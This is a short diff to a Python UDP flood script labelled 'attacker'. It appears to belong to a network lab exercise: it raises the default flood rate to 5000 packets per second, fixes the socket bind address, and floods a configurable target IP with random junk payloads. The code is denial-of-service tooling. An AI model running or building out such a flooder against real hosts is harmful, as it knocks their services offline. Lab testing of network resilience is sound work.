@@ -19,7 +19,7 @@ import time
 
 TARGET_IP  = os.environ.get('TARGET_IP', '')
 DURATION   = float(os.environ.get('DURATION', '30'))
-FLOOD_RATE = int(os.environ.get('FLOOD_RATE', '1000'))
+FLOOD_RATE = int(os.environ.get('FLOOD_RATE', '5000'))
 LABEL      = os.environ.get('LABEL', 'attacker')
 
 # Flood both ports used by 3.1 and 3.2
@@ -32,7 +32,7 @@ JUNK_PAYLOAD = os.urandom(1024)
 def run_attacker(target_ip):
     # type: (str) -> None
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind((target_ip, 0))   # bind to attacker's own IP
+    sock.bind(('0.0.0.0', 0))   # bind to attacker's own IP
 
     interval   = 1.0 / FLOOD_RATE
     deadline   = time.time() + DURATION
